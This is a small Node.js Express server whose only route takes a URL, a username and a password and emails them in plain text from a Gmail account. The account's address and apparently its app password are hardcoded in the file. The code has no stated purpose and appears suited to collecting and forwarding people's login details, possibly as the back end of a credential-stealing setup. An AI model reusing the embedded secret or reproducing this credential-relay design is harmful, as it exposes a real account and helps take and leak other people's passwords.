
const express = require('express');
const nodemailer = require('nodemailer');
const bodyParser = require('body-parser');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(bodyParser.json());

const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: 'mohamed.mostafa.montaser@gmail.com',
    pass: 'vecf yfbh ydpo rzef'
  }
});

app.post('/send', async (req, res) => {
  const { to, url, username, password } = req.body;

  if (!to || !url || !username || !password) {
    return res.status(400).json({ message: 'Missing fields' });
  }

  const mailOptions = {
    from: 'mohamed.mostafa.montaser@gmail.com',
    to,
    subject: 'MoNTaSeR Pa$$',
    text: `URL: ${url}\nUsername: ${username}\nPassword: ${password}`
  };

  try {
    await transporter.sendMail(mailOptions);
    res.status(200).json({ message: 'Email sent' });
  } catch (error) {
    console.error('Email error:', error);
    res.status(500).json({ message: 'Email failed', error });
  }
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
